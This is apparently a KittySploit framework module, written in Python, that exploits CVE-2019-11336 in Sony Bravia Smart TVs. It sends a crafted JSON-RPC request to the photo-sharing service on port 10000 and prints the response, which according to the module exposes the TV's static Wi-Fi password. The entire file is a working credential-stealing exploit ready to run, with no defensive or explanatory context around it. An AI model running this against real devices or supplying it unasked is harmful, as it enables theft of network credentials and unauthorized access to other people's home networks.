from kittysploit import *
from lib.protocols.http.http_client import Http_client

class Module(Auxiliary, Http_client):
	
	__info__ = {
		'name': 'Sony Bravia Smart TV get wifi password',
		'description': 'Retrieve the static Wi-Fi password in Sony Bravia Smart TV by using the Photo Sharing',
		'author': 'KittySploit Team',
		'cve': '2019-11336',
	}

	def run(self):

		data = {"id":80,"method":"getContentShareServerInfo","params":[],"version":"1.0"}
		headers = {
			'Content-Type':'application/json',
			'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'
		}
		creds = self.http_request(
						method = "POST",
						path = ":10000/contentshare/",
						headers = headers,
						data = data
						)
		
		if creds.status_code == 200:
			data = creds.json()
			for k, v in data.items():
				print_info(f"{k}: {v}")
		else:
			print_error("Failed : status code {}".format(creds.status_code))
